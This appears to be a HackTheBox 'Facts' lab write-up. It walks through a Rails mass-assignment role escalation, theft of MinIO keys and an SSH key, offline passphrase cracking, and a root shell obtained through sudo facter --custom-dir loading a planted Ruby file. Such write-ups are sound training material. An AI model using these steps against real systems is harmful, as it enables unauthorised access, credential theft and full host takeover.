---
title: "HTB - Facts"
date: 2026-03-15
tags: ["HackTheBox","Linux","Easy","Rails","MassAssignment","MinIO","GTFOBin","facter"]
categories: ["Machines&Challenges"]
difficulty: "Easy"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/facts.png"
---
| Field | Value |
|-------|-------|
| Difficulty | Easy |
| OS | Linux |
| Techniques | Mass Assignment · MinIO · ssh2john · facter GTFOBin |

---

## Summary

Facts is an Easy Linux machine running a Ruby on Rails CMS. The intended foothold is a **Mass Assignment** vulnerability in the password change endpoint - by appending `&password[role]=admin` to the intercepted request, a low-privilege user escalates to admin without touching the LFI path. As admin, MinIO S3 credentials are exposed in the General Site filesystem settings. Using the `mc` client, an SSH private key is pulled from the internal MinIO bucket. The key passphrase is cracked offline with `ssh2john` + `john` (rockyou.txt → `dragonballz`). SSH access lands as `trivia`, who can run `/usr/bin/facter` as root via sudo. A malicious Ruby script planted in `/tmp/piv` and loaded via `--custom-dir` gives a root shell.

---

## Attack Chain Overview

| # | Stage | Technique | CVE/Tool |
|---|-------|-----------|----------|
| 1 | Auth | Register/login as low-priv user | - |
| 2 | Foothold | Mass Assignment: `&password[role]=admin` | CWE-915 |
| 3 | Admin Panel | Settings → Filesystem → MinIO Access+Secret Keys | - |
| 4 | MinIO | `mc alias` + `mc get internal/.ssh/id_ed25519` | mc client |
| 5 | Crack | `ssh2john` + john rockyou.txt → `dragonballz` | john |
| 6 | SSH | `ssh trivia@facts.htb -i id_ed25519` | - |
| 7 | Priv-Esc | `sudo facter --custom-dir=/tmp/piv` (malicious .rb) | facter GTFOBin |
| 8 | Root | `cat /root/root.txt` + `/home/william/flag.txt` | - |

---

## 01 - Foothold: Mass Assignment → Admin (CWE-915)

The Rails CMS does not whitelist attributes on the password update action. By injecting `password[role]=admin` into the PATCH `/admin/profile` body, Rails' strong parameters are bypassed and the role field is written directly to the DB.

### Step 1 - Navigate to profile edit

```
http://facts.htb/admin/profile/edit
# Click 'Change Password' to open the modal
```

### Step 2 - Intercept with Burp and inject role

```
# Intercept the PATCH request, append to the body:
&password%5Brole%5D=admin

# Full decoded body:
_method=patch
&authenticity_token=<token>
&password[password]=yournewpassword
&password[password_confirmation]=yournewpassword
&password[role]=admin
```

### Step 3 - Forward and verify

Navigate to the Admin UI - full admin panel now accessible: Dashboard, Contents, Media, Comments, Appearance, Plugins, Users, Settings.

---

## 02 - Getting MinIO Credentials

Navigate to **Settings → General Site → Filesystem Settings**:

```
Save files in aws s3: [checked]
Aws s3 access key:    <ACCESS_KEY>
Aws s3 secret key:    <SECRET_KEY>
Aws s3 bucket name:   randomfacts
Aws s3 region:        us-east-1
Aws s3 bucket endpoint: http://localhost:54321
```

---

## 03 - Connect to MinIO and Get the SSH Key

```bash
# Install mc (MinIO client)
curl -O https://dl.min.io/client/mc/release/linux-amd64/mc
chmod +x mc && sudo mv mc /usr/local/bin/

# Set alias and browse buckets
mc alias set facts http://facts.htb:54321 <ACCESS_KEY> <SECRET_KEY>
mc ls facts/
# internal/
# randomfacts/

# Pull the SSH private key
mc get facts/internal/.ssh/id_ed25519
# Key comment reveals owner: trivia@facts.htb
```

---

## 04 - Crack Key Passphrase + SSH Access

```bash
# Convert key to crackable hash
ssh2john ./id_ed25519 > id.hash

# Crack with rockyou
john --wordlist=/usr/share/wordlists/rockyou.txt id.hash
john --show id.hash
# id_ed25519:dragonballz
```

```bash
chmod 600 ./id_ed25519
ssh trivia@<IP_MACHINE> -i ./id_ed25519

trivia@facts:~$ id
uid=1001(trivia) gid=1001(trivia) groups=1001(trivia)
trivia@facts:~$ cat ~/user.txt
```

---

## 05 - Privilege Escalation: facter --custom-dir

### Enumerate sudo

```bash
trivia@facts:~$ sudo -l
# (ALL) NOPASSWD: /usr/bin/facter
```

**facter** is a system facts tool used by Puppet. The `--custom-dir` flag specifies a directory of `.rb` files to execute as custom facts. Since facter runs as root via sudo, any Ruby code executes with root privileges.

### Plant malicious Ruby script and execute

```bash
# Step 1 - Create custom facts directory
mkdir /tmp/piv

# Step 2 - Write malicious Ruby fact
echo 'exec "/bin/sh"' > /tmp/piv/a.rb

# Step 3 - Run facter with custom dir
sudo /usr/bin/facter --custom-dir=/tmp/piv
# Root shell spawned
```

```
# id
uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt
# cat /home/william/flag.txt
```

---

## Vulnerabilities Referenced

| ID/Class | Component | Type | Description |
|----------|-----------|------|-------------|
| CWE-915 | Rails CMS password update | Mass Assignment | `password[role]=admin` injected into PATCH body |
| Credential Exposure | MinIO admin panel | Info Disclosure | AWS S3 keys visible in plaintext |
| facter GTFOBin | `/usr/bin/facter` (sudo) | Priv-Esc | `--custom-dir` loads arbitrary Ruby scripts as root |

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Burp Suite | Intercept and modify the password PATCH request |
| mc (MinIO client) | Set alias and download objects from MinIO buckets |
| ssh2john | Convert SSH private key to john-crackable hash |
| john (JtR) | Offline passphrase cracking against rockyou.txt |
| ssh | Authenticate as trivia using cracked private key |
| facter | GTFOBin - execute Ruby script via `--custom-dir` as root |
